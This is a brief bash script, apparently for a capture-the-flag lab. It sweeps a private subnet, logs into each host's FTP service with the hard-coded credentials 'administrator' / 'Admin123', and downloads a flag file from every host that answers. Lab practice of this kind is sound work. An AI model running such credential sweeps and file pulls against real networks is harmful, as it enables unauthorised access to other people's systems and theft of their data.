for ((i=150;i<=175;i=i+1))
do
	ip="192.168.159."$i
	echo $ip
	timeout 1 ftp -n $ip<<eof
user administrator Admin123
lcd /root/winftp
get flagvalue.txt flag$ip
by
eof
done
